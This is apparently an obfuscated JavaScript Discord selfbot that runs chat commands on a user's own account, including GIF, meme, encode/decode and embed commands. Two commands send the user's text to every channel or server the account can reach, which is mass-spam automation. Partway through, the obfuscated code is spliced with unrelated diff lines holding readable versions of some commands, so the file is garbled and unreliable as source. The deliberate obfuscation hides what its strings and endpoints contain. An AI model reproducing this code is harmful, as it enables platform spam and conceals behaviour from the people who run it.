_0x1b369a[_0x1be328(0x49d,0x331)][_0x1be328(0x4c0,0x3d9)](_0x1be328(0x575,0x40f));if(enabled===!![]){let _0x4cc7c0=new Discord[(_0x1be328(0x508,0x532))]()[_0x1be328(0x4a2,0x561)](_0x1be328(0x7a3,0x69b))[_0x1be328(0x5aa,0x521)](color?color:_0x1be328(0x4c1,0x58e))[_0x1be328(0x69b,0x5b2)](footer?footer:_0x1be328(0x524,0x437))[_0x1be328(0x49f,0x318)](_0xa4b92f[_0x1be328(0x6c3,0x63c)]);_0x1b369a[_0x1be328(0x49d,0x489)][_0x1be328(0x4c0,0x4a0)](_0x4cc7c0);}else{let _0x26c5d0=new Discord[(_0x1be328(0x4d6,0x59e))](_0xa4b92f[_0x1be328(0x6c3,0x74a)],_0x1be328(0x55c,0x4b9));_0x1b369a[_0x1be328(0x49d,0x48c)][_0x1be328(0x4c0,0x360)](_0x26c5d0);}}if(_0x390a85===_0x1be328(0x6ea,0x624)){console[_0x1be328(0x6da,0x7d5)]('['+colors[_0x1be328(0x57b,0x576)](moment()[_0x1be328(0x4bf,0x414)]()[_0x1be328(0x6ed,0x85a)](_0x1be328(0x5fa,0x514)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x407))+'\x20'+colors[_0x1be328(0x5db,0x72d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x67c)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5d4)]&&_0x1b369a[_0x1be328(0x594,0x61d)]();const {body:_0x2b7bb3}=await superagent[_0x1be328(0x6b4,0x5e7)](_0x1be328(0x609,0x5bb));if(!_0x2b7bb3)return _0x1b369a[_0x1be328(0x49d,0x46c)][_0x1be328(0x4c0,0x450)](_0x1be328(0x575,0x4f9));if(enabled===!![]){let _0xd676e=new Discord[(_0x1be328(0x508,0x3b5))]()[_0x1be328(0x4a2,0x3c7)](_0x1be328(0x4a5,0x3d9))[_0x1be328(0x5aa,0x60f)](color?color:_0x1be328(0x4c1,0x369))[_0x1be328(0x69b,0x52c)](footer?footer:_0x1be328(0x524,0x5bf))[_0x1be328(0x49f,0x3fa)](_0x2b7bb3[_0x1be328(0x6c3,0x634)]);_0x1b369a[_0x1be328(0x49d,0x586)][_0x1be328(0x4c0,0x3d9)](_0xd676e);}else{let _0x318540=new Discord[(_0x1be328(0x4d6,0x515))](_0x2b7bb3[_0x1be328(0x6c3,0x82f)],_0x1be328(0x606,0x491));_0x1b369a[_0x1be328(0x49d,0x3e5)][_0x1be328(0x4c0,0x551)](_0x318540);}}if(_0x390a85===_0x1be328(0x4a0,0x56e)){console[_0x1be328(0x6da,0x709)]('['+colors[_0x1be328(0x57b,0x4a6)](moment()[_0x1be328(0x4bf,0x5da)]()[_0x1be328(0x6ed,0x680)](_0x1be328(0x5fa,0x5f6)))+']\x20'+colors[_0x1be328(0x632,0x721)](_0x1be328(0x596,0x70a))+'\x20'+colors[_0x1be328(0x5db,0x6a3)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x71b)]&&_0x1b369a[_0x1be328(0x594,0x424)]();const {body:_0x1a0d43}=await superagent[_0x1be328(0x6b4,0x583)](_0x1be328(0x5e3,0x4fb));if(!_0x1a0d43)return _0x1b369a[_0x1be328(0x49d,0x360)][_0x1be328(0x4c0,0x4f0)](_0x1be328(0x575,0x6b9));if(enabled===!![]){let _0x104c49=new Discord[(_0x1be328(0x508,0x650))]()[_0x1be328(0x4a2,0x366)](_0x1be328(0x4df,0x35c))[_0x1be328(0x5aa,0x652)](color?color:'#1B78E7')[_0x1be328(0x69b,0x6bc)](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘')[_0x1be328(0x49f,0x3f0)](_0x1a0d43['link']);_0x1b369a[_0x1be328(0x49d,0x4a5)][_0x1be328(0x4c0,0x3ae)](_0x104c49);}else{let _0x569fa5=new Discord[(_0x1be328(0x4d6,0x3ed))](_0x1a0d43[_0x1be328(0x6c3,0x7ab)],_0x1be328(0x5ba,0x4ff));_0x1b369a[_0x1be328(0x49d,0x4cb)][_0x1be328(0x4c0,0x557)](_0x569fa5);}}if(_0x390a85===_0x1be328(0x4fe,0x60c)){console[_0x1be328(0x6da,0x811)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x3c0)]()[_0x1be328(0x6ed,0x812)](_0x1be328(0x5fa,0x5a4)))+']\x20'+colors[_0x1be328(0x632,0x6f6)](_0x1be328(0x596,0x5a8))+'\x20'+colors[_0x1be328(0x5db,0x461)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5c7)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6fe)]&&_0x1b369a[_0x1be328(0x594,0x44a)]();const {body:_0x3b1097}=await superagent[_0x1be328(0x6b4,0x56e)](_0x1be328(0x600,0x76f));if(!_0x3b1097)return _0x1b369a[_0x1be328(0x49d,0x48c)][_0x1be328(0x4c0,0x646)](_0x1be328(0x575,0x550));_0x1b369a[_0x1be328(0x49d,0x604)][_0x1be328(0x4c0,0x618)](_0x3b1097[_0x1be328(0x6d9,0x79d)]);}if(_0x390a85===_0x1be328(0x4cc,0x362)){console[_0x1be328(0x6da,0x671)]('['+colors[_0x1be328(0x57b,0x41d)](moment()[_0x1be328(0x4bf,0x3ac)]()[_0x1be328(0x6ed,0x79d)](_0x1be328(0x5fa,0x470)))+']\x20'+colors[_0x1be328(0x632,0x7b6)](_0x1be328(0x596,0x5c3))+'\x20'+colors[_0x1be328(0x5db,0x5b8)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x766)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5a6)]&&_0x1b369a[_0x1be328(0x594,0x6e7)]();const {body:_0xcd915f}=await superagent[_0x1be328(0x6b4,0x619)](_0x1be328(0x656,0x688));if(!_0xcd915f)return _0x1b369a[_0x1be328(0x49d,0x425)][_0x1be328(0x4c0,0x51a)](_0x1be328(0x575,0x48e));_0x1b369a[_0x1be328(0x49d,0x4ae)][_0x1be328(0x4c0,0x43f)](_0xcd915f[_0x1be328(0x6d9,0x86d)]);}if(_0x390a85===_0x1be328(0x78f,0x854)){console[_0x1be328(0x6da,0x702)]('['+colors[_0x1be328(0x57b,0x4ff)](moment()[_0x1be328(0x4bf,0x386)]()[_0x1be328(0x6ed,0x7e3)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x538)](_0x1be328(0x596,0x589))+'\x20'+colors[_0x1be328(0x5db,0x717)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x788)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x58a)]&&_0x1b369a[_0x1be328(0x594,0x5f0)]();const {body:_0xf3ef8c}=await superagent[_0x1be328(0x6b4,0x680)](_0x1be328(0x64f,0x4e6));if(!_0xf3ef8c)return _0x1b369a[_0x1be328(0x49d,0x610)]['send'](_0x1be328(0x575,0x575));_0x1b369a[_0x1be328(0x49d,0x410)][_0x1be328(0x4c0,0x581)](_0xf3ef8c[_0x1be328(0x6d9,0x637)]);}if(_0x390a85==='wink'){console[_0x1be328(0x6da,0x620)]('['+colors[_0x1be328(0x57b,0x5af)](moment()[_0x1be328(0x4bf,0x5b4)]()['format'](_0x1be328(0x5fa,0x4f0)))+']\x20'+colors[_0x1be328(0x632,0x7c4)](_0x1be328(0x596,0x501))+'\x20'+colors[_0x1be328(0x5db,0x65e)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5f9)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x60d)]&&_0x1b369a[_0x1be328(0x594,0x575)]();const _0xcfebbc=_0x1b369a[_0x1be328(0x4d3,0x4d2)][_0x1be328(0x665,0x717)][_0x1be328(0x6a5,0x6fe)]();if(!_0xcfebbc)return _0x1b369a[_0x1be328(0x49d,0x529)][_0x1be328(0x4c0,0x629)](_0x1be328(0x4eb,0x633));const {body:_0x17263a}=await superagent[_0x1be328(0x6b4,0x6e5)](_0x1be328(0x642,0x4dd));if(!_0x17263a)return _0x1b369a[_0x1be328(0x49d,0x51a)][_0x1be328(0x4c0,0x62c)](_0x1be328(0x575,0x66b));if(enabled===!![]){let _0x218adb=new Discord[(_0x1be328(0x508,0x5e1))]()[_0x1be328(0x76c,0x8c7)](_0x1b369a[_0x1be328(0x5f7,0x731)]+_0x1be328(0x4f2,0x48c)+_0xcfebbc)[_0x1be328(0x5aa,0x4a8)](color?color:_0x1be328(0x4c1,0x33f))['setFooter'](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘')[_0x1be328(0x49f,0x61f)](_0x17263a[_0x1be328(0x6c3,0x814)]);_0x1b369a[_0x1be328(0x49d,0x614)][_0x1be328(0x4c0,0x37c)](_0x218adb);}else{let _0x4f1ed7=new Discord[(_0x1be328(0x4d6,0x585))](_0x17263a[_0x1be328(0x6c3,0x79f)],_0x1be328(0x582,0x512));_0x1b369a[_0x1be328(0x49d,0x357)][_0x1be328(0x4c0,0x4f0)](_0x1b369a['author'][_0x1be328(0x5fb,0x6e9)]+_0x1be328(0x4f2,0x407)+_0xcfebbc[_0x1be328(0x5fb,0x78e)],_0x4f1ed7);}}if(_0x390a85===_0x1be328(0x6ce,0x750)){console[_0x1be328(0x6da,0x823)]('['+colors[_0x1be328(0x57b,0x6e3)](moment()[_0x1be328(0x4bf,0x474)]()[_0x1be328(0x6ed,0x841)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x4eb)](_0x1be328(0x596,0x486))+'\x20'+colors[_0x1be328(0x5db,0x528)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x62a)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6b1)]&&_0x1b369a[_0x1be328(0x594,0x4bb)]();const _0x503a37=_0x1b369a[_0x1be328(0x4d3,0x42a)]['users'][_0x1be328(0x6a5,0x62c)]();if(!_0x503a37)return _0x1b369a['channel'][_0x1be328(0x4c0,0x41e)](_0x1be328(0x4eb,0x3bc));const {body:_0x4e8f6d}=await superagent[_0x1be328(0x6b4,0x602)](_0x1be328(0x6db,0x719));if(!_0x4e8f6d)return _0x1b369a['channel'][_0x1be328(0x4c0,0x3cb)](_0x1be328(0x575,0x449));if(enabled===!![]){let _0x63bf3e=new Discord[(_0x1be328(0x508,0x5b1))]()['setDescription'](_0x1b369a[_0x1be328(0x5f7,0x682)]+_0x1be328(0x792,0x7e4)+_0x503a37)[_0x1be328(0x5aa,0x4a9)](color?color:_0x1be328(0x4c1,0x4a1))[_0x1be328(0x69b,0x74d)](footer?footer:_0x1be328(0x524,0x4a4))[_0x1be328(0x49f,0x35b)](_0x4e8f6d[_0x1be328(0x6c3,0x64a)]);_0x1b369a['channel'][_0x1be328(0x4c0,0x4ac)](_0x63bf3e);}else{let _0x118d8d=new Discord[(_0x1be328(0x4d6,0x629))](_0x4e8f6d[_0x1be328(0x6c3,0x62a)],_0x1be328(0x566,0x6b1));_0x1b369a[_0x1be328(0x49d,0x423)][_0x1be328(0x4c0,0x644)](_0x1b369a[_0x1be328(0x5f7,0x4da)][_0x1be328(0x5fb,0x521)]+_0x1be328(0x792,0x632)+_0x503a37[_0x1be328(0x5fb,0x544)],_0x118d8d);}}if(_0x390a85===_0x1be328(0x6d6,0x7a4)){console[_0x1be328(0x6da,0x7d5)]('['+colors[_0x1be328(0x57b,0x661)](moment()[_0x1be328(0x4bf,0x4d1)]()[_0x1be328(0x6ed,0x5eb)](_0x1be328(0x5fa,0x6af)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x589))+'\x20'+colors[_0x1be328(0x5db,0x56d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x773)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x72e)]&&_0x1b369a[_0x1be328(0x594,0x5a3)]();const _0x363a95=_0x1b369a[_0x1be328(0x4d3,0x5e2)][_0x1be328(0x665,0x63b)][_0x1be328(0x6a5,0x704)]();if(!_0x363a95)return _0x1b369a[_0x1be328(0x49d,0x38d)][_0x1be328(0x4c0,0x611)]('Please\x20mention\x20a\x20user.');const {body:_0x3d33cd}=await superagent[_0x1be328(0x6b4,0x5b8)](_0x1be328(0x5d7,0x6ff));if(!_0x3d33cd)return _0x1b369a[_0x1be328(0x49d,0x410)][_0x1be328(0x4c0,0x556)](_0x1be328(0x575,0x585));if(enabled===!![]){let _0x581974=new Discord[(_0x1be328(0x508,0x492))]()[_0x1be328(0x76c,0x6c1)](_0x1b369a[_0x1be328(0x5f7,0x783)]+_0x1be328(0x726,0x5cb)+_0x363a95)[_0x1be328(0x5aa,0x4e8)](color?color:_0x1be328(0x4c1,0x483))[_0x1be328(0x69b,0x7ad)](footer?footer:_0x1be328(0x524,0x5c0))[_0x1be328(0x49f,0x5f6)](_0x3d33cd[_0x1be328(0x6c3,0x7f4)]);_0x1b369a[_0x1be328(0x49d,0x530)][_0x1be328(0x4c0,0x334)](_0x581974);}else{let _0x1c9e2a=new Discord[(_0x1be328(0x4d6,0x5ca))](_0x3d33cd[_0x1be328(0x6c3,0x55e)],_0x1be328(0x5bb,0x667));_0x1b369a[_0x1be328(0x49d,0x5cf)][_0x1be328(0x4c0,0x4c2)](_0x1b369a[_0x1be328(0x5f7,0x73b)][_0x1be328(0x5fb,0x4f3)]+_0x1be328(0x5d6,0x648)+_0x363a95[_0x1be328(0x5fb,0x49f)],_0x1c9e2a);}}if(_0x390a85==='randomtoken'){console[_0x1be328(0x6da,0x605)]('['+colors[_0x1be328(0x57b,0x5d1)](moment()['utc']()['format'](_0x1be328(0x5fa,0x47d)))+']\x20'+colors[_0x1be328(0x632,0x741)](_0x1be328(0x596,0x4d6))+'\x20'+colors[_0x1be328(0x5db,0x64f)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x67f)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7f5)]&&_0x1b369a[_0x1be328(0x594,0x529)]();const {body:_0x3cae17}=await superagent[_0x1be328(0x6b4,0x5d8)](_0x1be328(0x49e,0x529));if(!_0x3cae17)return _0x1b369a[_0x1be328(0x49d,0x466)][_0x1be328(0x4c0,0x5c7)](_0x1be328(0x575,0x3ff));_0x1b369a[_0x1be328(0x49d,0x4f2)][_0x1be328(0x4c0,0x4e5)](_0x3cae17[_0x1be328(0x780,0x63e)]);}if(_0x390a85===_0x1be328(0x643,0x5d5)){console[_0x1be328(0x6da,0x83d)]('['+colors[_0x1be328(0x57b,0x5aa)](moment()[_0x1be328(0x4bf,0x366)]()[_0x1be328(0x6ed,0x785)](_0x1be328(0x5fa,0x4df)))+']\x20'+colors[_0x1be328(0x632,0x4d5)](_0x1be328(0x596,0x58a))+'\x20'+colors[_0x1be328(0x5db,0x74b)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x666)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5d2)]&&_0x1b369a[_0x1be328(0x594,0x4e3)]();const {body:_0xa64f54}=await superagent[_0x1be328(0x6b4,0x727)](_0x1be328(0x5a5,0x65c));if(!_0xa64f54)return _0x1b369a[_0x1be328(0x49d,0x559)][_0x1be328(0x4c0,0x649)](_0x1be328(0x575,0x6cf));if(enabled===!![]){let _0x4d9ffa=new Discord[(_0x1be328(0x508,0x67e))]()[_0x1be328(0x4a2,0x4fa)](_0xa64f54[_0x1be328(0x480,0x5c8)])[_0x1be328(0x49f,0x50b)](_0xa64f54[_0x1be328(0x6e2,0x59b)])[_0x1be328(0x5aa,0x4be)](color?color:_0x1be328(0x4c1,0x369))[_0x1be328(0x69b,0x5f2)](footer?footer:_0x1be328(0x524,0x507));_0x1b369a[_0x1be328(0x49d,0x5d3)][_0x1be328(0x4c0,0x4c3)](_0x4d9ffa);}else{let _0x4e6415=new Discord[(_0x1be328(0x4d6,0x636))](_0xa64f54[_0x1be328(0x6e2,0x638)],_0x1be328(0x5a0,0x5dc));_0x1b369a[_0x1be328(0x49d,0x55f)][_0x1be328(0x4c0,0x3e4)](_0xa64f54[_0x1be328(0x480,0x36e)],_0x4e6415);}}if(_0x390a85===_0x1be328(0x4c4,0x3ed)){console['log']('['+colors[_0x1be328(0x57b,0x4a4)](moment()[_0x1be328(0x4bf,0x5f7)]()[_0x1be328(0x6ed,0x6cd)](_0x1be328(0x5fa,0x75b)))+']\x20'+colors[_0x1be328(0x632,0x516)](_0x1be328(0x596,0x6cb))+'\x20'+colors[_0x1be328(0x5db,0x6d3)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4bb)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x752)]&&_0x1b369a['delete']();if(!_0x1748bb[-0x2614+0x2*-0x882+0x158*0x29])return _0x1b369a[_0x1be328(0x49d,0x571)][_0x1be328(0x4c0,0x56d)](_0x1be328(0x4a1,0x3cb));const _0x1ddb75=['encode',_0x1be328(0x5bf,0x733)];if(!_0x1ddb75['includes'](_0x1748bb[0x12f*0x20+-0xb1*0x27+-0xae9][_0x1be328(0x529,0x528)]()))return _0x1b369a[_0x1be328(0x49d,0x460)][_0x1be328(0x4c0,0x36d)](_0x1be328(0x4a1,0x585));let _0x175c86=_0x1748bb['slice'](0x160a+-0xe6*-0x13+-0x271b)[_0x1be328(0x5c6,0x65e)]('\x20');if(!_0x175c86)return _0x1b369a['channel'][_0x1be328(0x4c0,0x5bc)](_0x1be328(0x669,0x66d));if(_0x175c86[_0x1be328(0x537,0x526)]>0x147a+-0x1f*0x3+-0x101d)return _0x1b369a[_0x1be328(0x49d,0x37e)][_0x1be328(0x4c0,0x3e2)](_0x1be328(0x61a,0x5bc));if(_0x1748bb[0x5*0x769+-0x1c2a+-0x8e3][_0x1be328(0x529,0x3fd)]()===_0x1ddb75[-0x1567*0x1+-0xea5+-0x6*-0x602]){const {body:_0x41dc3d}=await superagent[_0x1be328(0x6b4,0x5c0)](_0x1be328(0x64a,0x53e)+_0x175c86);return _0x1b369a[_0x1be328(0x49d,0x5aa)][_0x1be328(0x4c0,0x4b6)](_0x41dc3d[_0x1be328(0x4c4,0x3af)]);}else{if(_0x1748bb[-0x2bb+0xbbf+0x904*-0x1]['toLowerCase']()===_0x1ddb75[-0x1bd1+-0x1*0x1fa9+0x3b7b]){const {body:_0x1fea05}=await superagent[_0x1be328(0x6b4,0x812)](_0x1be328(0x4c8,0x3b9)+_0x175c86);return _0x1b369a[_0x1be328(0x49d,0x52e)][_0x1be328(0x4c0,0x353)](_0x1fea05[_0x1be328(0x546,0x542)]);}}}if(_0x390a85===_0x1be328(0x5f4,0x53d)){console[_0x1be328(0x6da,0x67b)]('['+colors[_0x1be328(0x57b,0x506)](moment()[_0x1be328(0x4bf,0x601)]()[_0x1be328(0x6ed,0x82b)](_0x1be328(0x5fa,0x64e)))+']\x20'+colors[_0x1be328(0x632,0x723)](_0x1be328(0x596,0x6bb))+'\x20'+colors[_0x1be328(0x5db,0x5e9)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x734)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7ab)]&&_0x1b369a['delete']();if(!_0x1748bb[_0x1be328(0x5c6,0x573)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x53e)][_0x1be328(0x4c0,0x580)](_0x1be328(0x4de,0x61a));_0x1b369a[_0x1be328(0x59c,0x583)][_0x1be328(0x4bc,0x35d)][_0x1be328(0x584,0x488)](_0x305e38=>_0x305e38[_0x1be328(0x4b0,0x4db)]===_0x1be328(0x546,0x488))[_0x1be328(0x787,0x7ed)](_0x4567f1=>{const _0x4fc9e7=function(_0x5de273,_0x3317cd){return _0x1be328(_0x5de273-0x290,_0x3317cd);};console[_0x4fc9e7(0x96a,0x9a1)](colors[_0x4fc9e7(0x80b,0x6bc)](_0x4fc9e7(0x9ff,0x9e8)+_0x4567f1[_0x4fc9e7(0x870,0x98d)])),_0x4567f1[_0x4fc9e7(0x750,0x811)](_0x1748bb[_0x4fc9e7(0x856,0x86a)]('\x20'))[_0x4fc9e7(0x993,0x938)](_0x39e7a4=>{const _0x3f4a1b=function(_0x116cf5,_0x5d3a6f){return _0x4fc9e7(_0x116cf5- -0x2e8,_0x5d3a6f);};return console[_0x3f4a1b(0x682,0x685)](colors[_0x3f4a1b(0x6d6,0x84b)](_0x3f4a1b(0x491,0x4c3)+_0x4567f1[_0x3f4a1b(0x588,0x441)]));});});}if(_0x390a85===_0x1be328(0x795,0x8ff)){console['log']('['+colors[_0x1be328(0x57b,0x603)](moment()[_0x1be328(0x4bf,0x573)]()[_0x1be328(0x6ed,0x7a3)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x742)](_0x1be328(0x596,0x666))+'\x20'+colors[_0x1be328(0x5db,0x4c5)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x75d)]&&_0x1b369a[_0x1be328(0x594,0x4ee)]();if(!_0x1748bb[_0x1be328(0x5c6,0x754)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x631)][_0x1be328(0x4c0,0x3bb)](_0x1be328(0x4de,0x44c));_0x1b369a[_0x1be328(0x59c,0x50a)][_0x1be328(0x59a,0x5c9)][_0x1be328(0x787,0x893)](_0x174f9a=>{const _0x2bf117=function(_0x2b4f15,_0x9edd1b){return _0x1be328(_0x9edd1b-0x3d1,_0x2b4f15);};try{_0x174f9a[_0x2bf117(0x7bc,0x891)](_0x1748bb[_0x2bf117(0xaf3,0x997)]('\x20'))[_0x2bf117(0xa40,0xad4)](_0x2503ab=>{const _0x1a0f01=function(_0x1d3414,_0x171db8){return _0x2bf117(_0x1d3414,_0x171db8- -0x384);};return console[_0x1a0f01(0x79d,0x727)](colors[_0x1a0f01(0x75d,0x77b)](_0x1a0f01(0x725,0x741)+_0x174f9a[_0x1a0f01(0x4ca,0x53b)][_0x1a0f01(0x750,0x707)]));}),console[_0x2bf117(0xaab,0xaab)](colors[_0x2bf117(0x7bb,0x94c)](_0x2bf117(0xb7b,0xac2)+_0x174f9a[_0x2bf117(0x8cd,0x8bf)][_0x2bf117(0xb37,0xa8b)]));}catch(_0x48dadb){return console[_0x2bf117(0xb6b,0xaab)](colors[_0x2bf117(0xbe9,0xaff)](_0x2bf117(0xa41,0xac5)+_0x174f9a[_0x2bf117(0x92c,0x8bf)][_0x2bf117(0xb79,0xa8b)]));}});}if(_0x390a85===_0x1be328(0x502,0x5f1)){console[_0x1be328(0x6da,0x837)]('['+colors[_0x1be328(0x57b,0x54b)](moment()[_0x1be328(0x4bf,0x367)]()[_0x1be328(0x6ed,0x632)](_0x1be328(0x5fa,0x768)))+']\x20'+colors[_0x1be328(0x632,0x732)](_0x1be328(0x596,0x64c))+'\x20'+colors[_0x1be328(0x5db,0x71e)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x63f)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5f0)]&&_0x1b369a['delete']();if(!_0x1748bb[_0x1be328(0x5c6,0x451)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x55e)][_0x1be328(0x4c0,0x459)](_0x1be328(0x5d5,0x69e));const _0x368dca=_0x1b369a[_0x1be328(0x4f8,0x437)][_0x1be328(0x764,0x8cf)](-0x1*-0x1e5d+0x2429+-0x427f)[_0x1be328(0x67f,0x7b6)](_0x1be328(0x6c7,0x5ab));let _0x280350=new Discord[(_0x1be328(0x508,0x501))]();if(_0x368dca[-0x10d8+0xae2*-0x2+-0x1*-0x269c])_0x280350[_0x1be328(0x4a2,0x591)](_0x368dca[-0x1556*-0x1+-0x7*-0x15f+0x1eef*-0x1]);if(_0x368dca[-0x266d+-0x13b6+0x4*0xe89])_0x280350[_0x1be328(0x76c,0x8e1)](_0x368dca[0x1e0*0x4+0x4ea+0x161*-0x9]);if(_0x368dca[-0x18*-0x42+-0x3*0xb1c+0x1b26])_0x280350['setColor']('0x'+_0x368dca[-0x22b+0x125*0x1+-0x2c*-0x6]);if(_0x368dca[0x18df+0x1a3*-0x1+-0x1739])_0x280350[_0x1be328(0x69b,0x63f)](_0x368dca[-0x57a*-0x1+-0x146e+0xef7]);if(_0x368dca[0x982*-0x1+-0x1*0x10c+0xa93*0x1])_0x280350[_0x1be328(0x735,0x5cc)](_0x368dca[-0x337+-0x2466+0x27a2]);if(_0x368dca[-0x153e+0x201e+-0xada])_0x280350[_0x1be328(0x5d3,0x5d2)](_0x368dca[-0x2ea*-0x2+0xad0*0x3+-0x2*0x131f]);_0x1b369a[_0x1be328(0x49d,0x59f)][_0x1be328(0x4c0,0x3fc)](_0x280350);}if(_0x390a85===_0x1be328(0x51f,0x3ef)){console[_0x1be328(0x6da,0x743)]('['+colors[_0x1be328(0x57b,0x547)](moment()[_0x1be328(0x4bf,0x34f)]()[_0x1be328(0x6ed,0x6ff)](_0x1be328(0x5fa,0x4dc)))+']\x20'+colors[_0x1be328(0x632,0x635)](_0x1be328(0x596,0x62a))+'\x20'+colors[_0x1be328(0x5db,0x541)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x776)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x6f3)]();if(enabled===!![]){const _0x7ebd87=stripIndents`<> = required | [] = optional
+                Message » ${msg.createdTimestamp - message.createdTimestamp}ms
+                Websocket » ${bot.ping}ms${footer ? `\n\n${footer}` : null}
+                \`\`\``)
+            }
+        })
+    }
 
-            **${_0x32f547}8ball <question>** » Asks the 8ball a question of your choice
-            **${_0x32f547}avatar [user]** » Gets the avatar from the mentioned user
-            **${_0x32f547}cb <message>** » Talk to yourself as if it's a chat bot
-            **${_0x32f547}hug <user>** » Random anime hugging gif
-            **${_0x32f547}meme** » Sends a fresh meme of the internet
-            **${_0x32f547}ping** » Shows the message and the websocket latency
-            **${_0x32f547}pat <user>** » Random anime patting gif
-            **${_0x32f547}randomtoken** » Generates a random invalid discord bot token
-            **${_0x32f547}uptime** » Shows how long the bot has been currently been running for
-            **${_0x32f547}wink <user>** » Random anime winking gif`;let _0xd1cc69=new Discord[(_0x1be328(0x508,0x4aa))]()[_0x1be328(0x4a2,0x450)](_0x1be328(0x70d,0x635))[_0x1be328(0x5d3,0x709)](image?image:_0x1be328(0x56d,0x588))[_0x1be328(0x5aa,0x491)](color?color:_0x1be328(0x4c1,0x440))['setFooter'](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘');if(_0x7ebd87[_0x1be328(0x537,0x524)]<-0x13a0*0x1+0x22c2+-0x752)_0xd1cc69[_0x1be328(0x76c,0x688)](_0x7ebd87);else{const {body:_0xe7b742}=await post(_0x1be328(0x581,0x699))[_0x1be328(0x4c0,0x518)](_0x7ebd87);_0xd1cc69[_0x1be328(0x76c,0x781)](_0x1be328(0x6d1,0x859)+_0xe7b742['key']+'**');}_0x1b369a[_0x1be328(0x49d,0x38f)][_0x1be328(0x4c0,0x540)](_0xd1cc69);}else _0x1b369a[_0x1be328(0x49d,0x49f)][_0x1be328(0x4c0,0x4ee)](stripIndents`\`\`\`
+    if(cmd === "embed") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please specify a message.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setDescription(args.join(" "))
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            message.channel.send(embed)
+        } else {
+            message.channel.send(`\`\`\`${args.join(" ")}\`\`\``)
+        }
+    }
+
+    if(cmd === "avatar") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const mention = message.mentions.users.first() || message.author || bot.users.get(args[0]);
+        message.channel.send(mention.displayAvatarURL)
+    }
+
+    if(cmd === "serverinfo") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+    if(!message.guild) return message.channel.send("This command cannot be executed in Direct Messages or in Private Groups.")
+    //Guild Region
+    if (message.guild.region === "brazil") message.guild.region = "Brazi`";
+    if (message.guild.region === "europe") message.guild.region = "Europe";
+    if (message.guild.region === "hongkong") message.guild.region = "Hong Kon`";
+    if (message.guild.region === "india") message.guild.region = "India";
+    if (message.guild.region === "japan") message.guild.region = "Japan";
+    if (message.guild.region === "russia") message.guild.region = "Russia";
+    if (message.guild.region === "singapore") message.guild.region = "Singapore";
+    if (message.guild.region === "south africa") message.guild.region = "South Africa";
+    if (message.guild.region === "sydney") message.guild.region = "Sydney";
+    if (message.guild.region === "us-central") message.guild.region = "US Central";
+    if (message.guild.region === "us-east") message.guild.region = "US East";
+    if (message.guild.region === "us-south") message.guild.region = "US South";
+    if (message.guild.region === "us-west") message.guild.region = "US West";
+    //Guild Verification Level
+    if (message.guild.verificationLevel === "NONE") message.guild.verificationLevel = "None";
+    if (message.guild.verificationLevel === "LOW") message.guild.verificationLevel = "Low";
+    if (message.guild.verificationLevel === "MEDIUM") message.guild.verificationLevel = "Medium";
+    if (message.guild.verificationLevel === "HIGH") message.guild.verificationLevel = "High";
+    if (message.guild.verificationLevel === "VERY_HIGH") message.guild.verificationLevel = "`Highest";
+    //Others
+    const role = message.guild.roles.first(20).map(r => r).join(", ")
+    const role2 = message.guild.roles.map(r => r).join(", ")
+    const RoleAmount = message.guild.roles.size - 20
+    //Something else
+    const dnd = message.guild.members.filter(user => user.presence.status == "dnd").size
